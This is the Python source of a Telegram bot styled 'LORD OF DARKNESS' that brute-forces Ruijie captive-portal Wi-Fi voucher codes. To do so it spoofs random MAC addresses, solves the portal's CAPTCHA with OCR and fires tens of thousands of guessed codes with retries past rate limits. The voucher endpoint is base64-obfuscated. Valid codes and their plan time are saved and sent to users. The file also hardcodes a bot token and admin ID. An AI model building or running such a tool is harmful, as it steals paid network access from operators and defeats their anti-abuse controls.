# -*- coding: utf-8 -*-
"""
LORD OF DARKNESS — Ruijie Voucher Free
 Bot
Lord of Darkness| မှ Code Hack Bot | Free Run
"""
import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiohttp import web
import cv2, ddddocr, numpy as np
from datetime import datetime, timedelta, timezone
from collections import deque

# ════════════════════════════════════════════════════════════════
#  CONFIG
# ════════════════════════════════════════════════════════════════
BOT_TOKEN = "8858819080:AAHcKCb3Ec0X8h5amJaEHWh4AX-TEUVk2OM"
ADMIN_ID = "7294591323"

# ════════════════════════════════════════════════════════════════
#  SPEED CONFIG - 5000+ codes/min
# ════════════════════════════════════════════════════════════════
CONCURRENCY = 50000          

BATCH_SIZE = 20000          

TIMEOUT = 200               

# ════════════════════════════════════════════════════════════════
#  SPEED LIMITER - 5000/min
# ════════════════════════════════════════════════════════════════
_last_checks = deque()

async def limit_speed():
    now = time.time()
    while _last_checks and now - _last_checks[0] > 60:
        _last_checks.popleft()
    if len(_last_checks) >= 50000:
        await asyncio.sleep(60 - (now - _last_checks[0]) + 0.2)
    _last_checks.append(time.time())

# ════════════════════════════════════════════════════════════════
#  GLOBAL STATE
# ════════════════════════════════════════════════════════════════
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}
success_messages = {}
limited_messages = {}
retry_counts = {}
captcha_state = {}

session = None
_connector = None
_voucher_sem = None
_start_time = time.monotonic()
_ocr = ddddocr.DdddOcr(show_ad=False)

# ════════════════════════════════════════════════════════════════
#  LOCAL PERSISTENCE (No GitHub)
# ════════════════════════════════════════════════════════════════
STATE_FILE = "state.json"
HITS_FILE = "hits.json"

def save_state():
    try:
        payload = {
            "user_data": {str(k): v for k, v in user_data.items()},
        }
        with open(STATE_FILE, "w") as f:
            json.dump(payload, f)
    except Exception as e:
        print(f"[save_state] error: {e}")

def load_state():
    global user_data
    if not os.path.exists(STATE_FILE):
        return
    try:
        with open(STATE_FILE) as f:
            payload = json.load(f)
        for k, v in payload.get("user_data", {}).items():
            user_data[int(k)] = v
        print(f"[startup] Loaded state for {len(user_data)} user(s)")
    except Exception as e:
        print(f"[load_state] error: {e}")

def save_hits():
    try:
        with open(HITS_FILE, "w") as f:
            json.dump({str(k): v for k, v in success_texts.items()}, f, indent=2)
    except Exception as e:
        print(f"[save_hits] error: {e}")

def load_hits():
    try:
        if not os.path.exists(HITS_FILE):
            return
        with open(HITS_FILE) as f:
            payload = json.load(f)
        for k, v in payload.items():
            try:
                cid = int(k)
            except ValueError:
                continue
            success_texts[cid] = v
        print(f"[startup] Loaded {sum(len(v) for v in success_texts.values())} local hits")
    except Exception as e:
        print(f"[load_hits] error: {e}")

# ════════════════════════════════════════════════════════════════
#  WEB SERVER
# ════════════════════════════════════════════════════════════════
_web_start = time.time()

async def handle(request):
    up = int(time.time() - _web_start)
    h, r = divmod(up, 3600)
    m, s = divmod(r, 60)
    return web.json_response({
        "status": "ok",
        "bot": "LORD OF DARKNESS",
        "uptime": f"{h}h {m}m {s}s",
        "speed": "50000+ codes/min"
    })

async def web_server():
    app = web.Application()
    app.router.add_get("/", handle)
    app.router.add_get("/ping", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8099))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    print(f"🌐 Web server on port {port}")

# ════════════════════════════════════════════════════════════════
#  UI HELPERS
# ════════════════════════════════════════════════════════════════
def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📥 /input", callback_data="menu_input"),
        InlineKeyboardButton("🔍 /scan", callback_data="menu_scan"),
        InlineKeyboardButton("🔄 /recheck", callback_data="menu_recheck"),
        InlineKeyboardButton("📋 /saved", callback_data="menu_saved"),
        InlineKeyboardButton("⏹ /stop", callback_data="menu_stop"),
        InlineKeyboardButton("📊 /status", callback_data="menu_status"),
        InlineKeyboardButton("❓ Help", callback_data="menu_help")
    )
    return markup

def scan_mode_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("6-digit", callback_data="scan_6"),
        InlineKeyboardButton("7-digit", callback_data="scan_7"),
        InlineKeyboardButton("8-digit", callback_data="scan_8"),
        InlineKeyboardButton("ascii-lower", callback_data="scan_ascii"),
        InlineKeyboardButton("all (a-z0-9)", callback_data="scan_all"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return markup

# ════════════════════════════════════════════════════════════════
#  PORTAL HELPERS
# ════════════════════════════════════════════════════════════════
def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def check_session_url(session_url):
    try:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
        return all(k in params for k in required)
    except:
        return False

async def get_session_id(sess, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

# ════════════════════════════════════════════════════════════════
#  CAPTCHA
# ════════════════════════════════════════════════════════════════
def _ocr_sync(img_bytes):
    try:
        arr = np.frombuffer(img_bytes, np.uint8)
        img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thr = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buf = cv2.imencode(".png", thr)
        return _ocr.classification(buf.tobytes()).upper()
    except:
        return None

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Captcha_Image(sess, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with sess.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(sess, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with sess.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

# ════════════════════════════════════════════════════════════════
#  CODE HELPERS
# ════════════════════════════════════════════════════════════════
def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

def all_generator(length=6):
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def ascii_generator(length=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        hours = int(total_minutes) // 60
        minutes = int(total_minutes) % 60
        if hours > 0 and minutes > 0:
            return f"{hours}h {minutes}m"
        elif hours > 0:
            return f"{hours}h"
        else:
            return f"{minutes}m"
    except:
        return 'Unknown'

async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=15)
        ) as fresh_session:
            async with fresh_session.get(
                f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
                headers=headers
            ) as req:
                respond = await req.json()
                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
    except:
        return "📋 Plan: Unknown | ⏳ Time: Unknown"

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍Scanning Codes...\n\n"
            f"📦Checked : {checked:,}/{total:,}\n"
            f"📊Progress : {percent:.2f}%\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Found : {found}\n"
            f"🔁Retry : {retries}\n"
            f"[{bar}]"
        )
    return (
        f"🔍Scanning Codes...\n\n"
        f"📦Checked : {checked:,}\n"
        f"⚡Speed : {speed_str}\n"
        f"✅Found : {found}\n"
        f"🔁Retry : {retries}\n"
        f"📊Status : running\n"
    )

# ════════════════════════════════════════════════════════════════
#  PERFORM CHECK (With Speed Limit)
# ════════════════════════════════════════════════════════════════
VOUCHER_URL = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    # ⏱️ Speed limit
    await limit_speed()
    
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    response = None
    for attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                return

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except:
                    continue
            if not auth_code:
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(VOUCHER_URL, json=data, headers=headers) as req:
                    response = await req.text()
                    print(f"[voucher] code={code} attempt={attempt+1} resp={response[:80]}")
            except:
                return

        if response and 'request limited' in response:
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            await asyncio.sleep(1)
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        code_line = "\n\n".join(success_texts[chat_id])
        
        if message:
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, f"✅ Success Codes:\n\n{code_line}", reply_markup=main_menu())
                    success_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[chat_id], text=f"✅ Success Codes:\n\n{code_line}", reply_markup=main_menu())
                    except:
                        sent = await bot.send_message(chat_id, f"✅ Success Codes:\n\n{code_line}", reply_markup=main_menu())
                        success_messages[chat_id] = sent.message_id
            except:
                pass
        save_hits()

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        limited_line = "\n\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n\n{limited_line}", reply_markup=main_menu())
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(chat_id=chat_id, message_id=limited_messages[chat_id], text=f"⚠️ Limited Codes:\n\n{limited_line}", reply_markup=main_menu())
                    except:
                        sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n\n{limited_line}", reply_markup=main_menu())
                        limited_messages[chat_id] = sent.message_id
            except:
                pass

# ════════════════════════════════════════════════════════════════
#  BRUTEFORCE ENGINE (Speed Optimized)
# ════════════════════════════════════════════════════════════════
async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)
            text = format_progress(checked, total, speed, found, retries)
            
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, reply_markup=main_menu())
            except:
                try:
                    new_msg = await bot.send_message(chat_id, text, reply_markup=main_menu())
                    progress_msg.message_id = new_msg.message_id
                except:
                    pass

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            finish_text = (
                f"✅ Scanning Completed!\n\n"
                f"📦 Checked : {checked:,}\n"
                f"💎 Found : {final_found}\n"
                f"📊 Progress : 100%\n"
                f"[████████████████████]"
            )
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text, reply_markup=main_menu())
            except:
                await bot.send_message(chat_id, finish_text, reply_markup=main_menu())
    finally:
        scan_tasks.pop(chat_id, None)
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)

# ════════════════════════════════════════════════════════════════
#  BOT HANDLERS
# ════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(
        message,
        "⚡ **LORD OF DARKNESS** ⚡\n\n"
        "Ruijie Voucher Finder Bot\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "✅ Key-Free — မလိုအပ်ပါ\n"
        "⚡ Speed — 5,000+ codes/min\n"
        "🔐 No GitHub — Local storage\n\n"
        "💡 **Commands:**\n"
        "/input [url] — Set Session URL\n"
        "/scan [mode] — Start scan\n"
        "/saved — Show found codes\n"
        "/stop — Stop scan\n"
        "/recheck — Recheck codes\n"
        "/status — Bot status (Admin)",
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

@bot.message_handler(commands=['menu'])
async def menu_command(message):
    await bot.reply_to(message, "📋 Main Menu", reply_markup=main_menu())

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/input your_session_url", reply_markup=main_menu())
        return

    url = args[1]
    chat_id = message.chat.id

    await bot.reply_to(message, "🔄 Session URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        user_data.setdefault(chat_id, {})
        user_data[chat_id]['session_url'] = url
        success_texts.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        save_state()
        await bot.send_message(
            chat_id,
            "✅ Session URL သိမ်းဆည်းပြီးပါပြီ\n\n"
            "💡 /scan 6 ဖြင့် စတင်ပါ",
            reply_markup=main_menu()
        )
    else:
        await bot.send_message(chat_id, "❌ Session URL မှားယွင်းနေပါသည်။", reply_markup=main_menu())

@bot.message_handler(commands=['scan'])
async def scan(message, mode=None):
    if mode is None:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>", reply_markup=scan_mode_menu())
            return
        mode = args[1]

    chat_id = message.chat.id

    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "/input ဖြင့် Session URL ထည့်ပါ", reply_markup=main_menu())
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "⚠️ Scan လုပ်နေပြီ — /stop နှိပ်ပါ", reply_markup=main_menu())
        return

    progress_msg = await bot.send_message(chat_id, "🔍 Scanning Codes...\n\n", reply_markup=main_menu())
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode,
            chat_id,
            user_data[chat_id]['session_url'],
            scan_id,
            message=message,
            progress_msg=progress_msg
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        success_messages.pop(chat_id, None)
        success_texts.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
        limited_texts.pop(chat_id, None)
        retry_counts.pop(chat_id, None)
        await bot.reply_to(message, "🛑 Scan ရပ်တန့်ပြီးပါပြီ", reply_markup=main_menu())
    else:
        await bot.reply_to(message, "⚪ ရပ်ရန် scan မရှိပါ", reply_markup=main_menu())

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "📭 ရှာတွေ့ထားသော code မရှိသေးပါ", reply_markup=main_menu())
        return

    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        parts.extend(success[:20])
    if limited:
        parts.append(f"\n⚠️️ **Limited Codes** ({len(limited)})")
        parts.extend(limited[:20])

    await bot.send_message(chat_id, "\n\n".join(parts), parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
        await bot.reply_to(message, "/input ဖြင့် Session URL ထည့်ပါ", reply_markup=main_menu())
        return

    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ", reply_markup=main_menu())
        return

    await bot.reply_to(message, "🔄 Rechecking...")
    new_success = []
    for item in success:
        code = item.split("🎫 ")[1].split("\n")[0] if "🎫 " in item else item
        recode = await perform_check(
            user_data[chat_id]['session_url'],
            code,
            chat_id,
            recheck=True,
            message=message
        )
        if recode:
            new_success.append(item)

    if new_success:
        success_texts[chat_id] = new_success
        save_hits()
        await bot.reply_to(message, f"✅ {len(new_success)} codes still valid", reply_markup=main_menu())
    else:
        success_texts[chat_id] = []
        save_hits()
        await bot.reply_to(message, "No valid codes found", reply_markup=main_menu())

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission", reply_markup=main_menu())
        return

    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    total_found = sum(len(v) for v in success_texts.values())

    await bot.reply_to(
        message,
        f"📊 **Bot Status**\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔄 Active Scans: {active_scans}\n"
        f"👥 Users: {len(user_data)}\n"
        f"💎 Total Found: {total_found}\n"
        f"⚡ Speed: 5,000+ codes/min\n"
        f"🔐 Auth: Key-Free ✅",
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

# ════════════════════════════════════════════════════════════════
#  CALLBACK HANDLERS
# ════════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id

    if call.data == "menu_back":
        await bot.edit_message_text("📋 Main Menu", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_input":
        await bot.edit_message_text("📥 /input your_session_url", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        await call.answer()
        return

    if call.data == "menu_scan":
        await bot.edit_message_text("🔍 Select scan mode:", chat_id=chat_id, message_id=msg_id, reply_markup=scan_mode_menu())
        await call.answer()
        return

    if call.data.startswith("scan_"):
        mode_map = {
            "scan_6": "6",
            "scan_7": "7",
            "scan_8": "8",
            "scan_ascii": "ascii-lower",
            "scan_all": "all"
        }
        mode = mode_map.get(call.data, "6")
        await bot.edit_message_text(f"🔍 Starting scan... Mode: {mode}", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        class FakeMessage:
            def __init__(self, chat_id):
                self.chat = type('obj', (object,), {'id': chat_id})()
        fake_msg = FakeMessage(chat_id)
        await scan(fake_msg, mode)
        await call.answer()
        return

    if call.data == "menu_recheck":
        await bot.edit_message_text("🔄 Rechecking...", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        class FakeMessage:
            def __init__(self, chat_id):
                self.chat = type('obj', (object,), {'id': chat_id})()
        await recheck(FakeMessage(chat_id))
        await call.answer()
        return

    if call.data == "menu_saved":
        await bot.edit_message_text("📋 Saved Codes", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        class FakeMessage:
            def __init__(self, chat_id):
                self.chat = type('obj', (object,), {'id': chat_id})()
        await saved_codes(FakeMessage(chat_id))
        await call.answer()
        return

    if call.data == "menu_stop":
        await bot.edit_message_text("⏹ Stopping scan...", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        class FakeMessage:
            def __init__(self, chat_id):
                self.chat = type('obj', (object,), {'id': chat_id})()
        await stop_scan(FakeMessage(chat_id))
        await call.answer()
        return

    if call.data == "menu_status":
        await bot.edit_message_text("📊 Bot Status", chat_id=chat_id, message_id=msg_id, reply_markup=main_menu())
        class FakeMessage:
            def __init__(self, chat_id):
                self.chat = type('obj', (object,), {'id': chat_id})()
        await status(FakeMessage(chat_id))
        await call.answer()
        return

    if call.data == "menu_help":
        help_text = (
            "📚 **Commands**\n\n"
            "/start — Main menu\n"
            "/input [url] — Set Session URL\n"
            "/scan [mode] — Start scan\n"
            "   Modes: 6, 7, 8, ascii-lower, all\n"
            "/saved — Show found codes\n"
            "/stop — Stop scan\n"
            "/recheck — Recheck codes\n"
            "/status — Bot status (Admin)"
        )
        await bot.edit_message_text(help_text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=main_menu())
        await call.answer()
        return

# ════════════════════════════════════════════════════════════════
#  SMART INPUT HANDLER
# ════════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda msg: msg.text and not msg.text.startswith("/"))
async def smart_input(message):
    text = message.text.strip()
    chat_id = message.chat.id

    if text.startswith("http") and ("ruijienetworks.com" in text or "portal" in text.lower()):
        if await check_session_url(text):
            user_data.setdefault(chat_id, {})
            user_data[chat_id]['session_url'] = text
            success_texts.pop(chat_id, None)
            limited_texts.pop(chat_id, None)
            save_state()
            await bot.send_message(chat_id, "✅ Session URL saved!\n\nSend /scan 6 to start", reply_markup=main_menu())
        else:
            await bot.send_message(chat_id, "❌ Invalid Session URL", reply_markup=main_menu())
        return

    await bot.send_message(chat_id, "💡 Send your Session URL to start\n\nOr use /scan 6", reply_markup=main_menu())

# ════════════════════════════════════════════════════════════════
#  POLLING & MAIN
# ════════════════════════════════════════════════════════════════
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=35)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    print("=" * 50)
    print("  ⚡ LORD OF DARKNESS")
    print("  GitHub: REMOVED")
    print("  Speed: 5,000+ codes/min")
    print("  Key: FREE")
    print("=" * 50)

    _connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=_connector,
        connector_owner=False
    )

    try:
        asyncio.create_task(web_server())
        load_state()
        load_hits()
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
